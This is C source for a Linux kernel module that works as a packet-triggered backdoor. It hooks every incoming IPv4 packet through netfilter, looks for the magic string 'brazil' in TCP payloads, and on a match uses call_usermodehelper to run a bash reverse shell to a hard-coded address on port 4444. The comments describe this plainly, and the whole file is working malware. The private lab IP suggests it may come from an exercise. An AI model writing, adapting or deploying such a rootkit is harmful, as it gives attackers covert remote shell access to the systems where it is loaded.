#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/ktime.h>
#include <linux/types.h>
#include <linux/kmod.h>

struct nf_hook_ops nfin;
struct work_arg_struct {
    struct work_struct work;
    char *data;
};
static struct work_arg_struct my_work;

MODULE_LICENSE("GPL");


// This function finds a sub value in a large memory area
// If the value was found, it is returned.
void *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
{
    int needle_first;
    const void *p = haystack;
    size_t plen = hlen;
    if (!nlen)
        return NULL;
    needle_first = *(unsigned char *)needle;
    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
    {
        if (!memcmp(p, needle, nlen))
            return (void *)p;
        p++;
        plen = hlen - (p - haystack);
    }
    return NULL;
}



// This function opens a reverse shell to a hard coded ip address
// It is added to the queue of running programs by the work struct
// and executed in user kode with call_usermodehelper
void bash_work_handler(struct work_struct *work){

    struct work_arg_struct *work_arg;
    work_arg = container_of(work, struct work_arg_struct, work);
    char* envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    char* argv[] = {"/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/192.168.56.1/4444 0>&1",NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return;
}


// This function hooks every incoming packet, the hook is placed
// on the kernel. The function looks for tcp packets with a hard
// coded value "brazil" in the data section of the packet. If it
// is found, the bash_work_handler function is executed.
unsigned int hook_func_in(void *priv,
            struct sk_buff *skb,
                            const struct nf_hook_state *state)
{
    struct ethhdr *eth;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    eth = (struct ethhdr*)skb_mac_header(skb);
    ip_header = (struct iphdr *)skb_network_header(skb);
    if (ip_header->protocol == IPPROTO_TCP){
        tcp_header = (struct tcphdr *)tcp_hdr(skb);
        int dport = htons((unsigned short int) tcp_header->dest);
        int rest_len = ip_header->tot_len - ((ip_header->ihl*4)+(tcp_header->doff *4));
        if (memmem(tcp_header+0x20, (size_t)rest_len, "brazil", 6)){
                printk(KERN_INFO "OMFGGGG ITS DOWN HERE!!");
                schedule_work(&my_work.work);
        }
        printk(KERN_INFO "Source MAC %pM, Dest MAC %pM\n", eth->h_source, eth->h_dest);
        printk(KERN_INFO "Source IP %pI4, Dest IP %pI4", &ip_header->saddr, &ip_header->daddr);
        printk(KERN_INFO "Source Port %d, Dest Port %d\n", htons((unsigned short int)tcp_header->source), dport);
    }
    return NF_ACCEPT;
}


static int __init start(void)
{
        INIT_WORK(&my_work.work, bash_work_handler);
        struct net *n;
		
		// Create the netfilter hook. hook only incoming IPV4 packets
		// with the hook_func_in function.
        nfin.hook     = hook_func_in;
        nfin.hooknum  = NF_INET_PRE_ROUTING;
        nfin.pf       = NFPROTO_IPV4;
        nfin.priority = NF_IP_PRI_FIRST;
		
		// Register the hook for every network interface.
        for_each_net(n)
                nf_register_net_hook(n, &nfin);
        return 0;
}


static void __exit bye(void)
{
        struct net *n;
		
		// Remove the hook from every network interface.
        for_each_net(n)
                nf_unregister_net_hook(n, &nfin);
}

module_init(start);
module_exit(bye);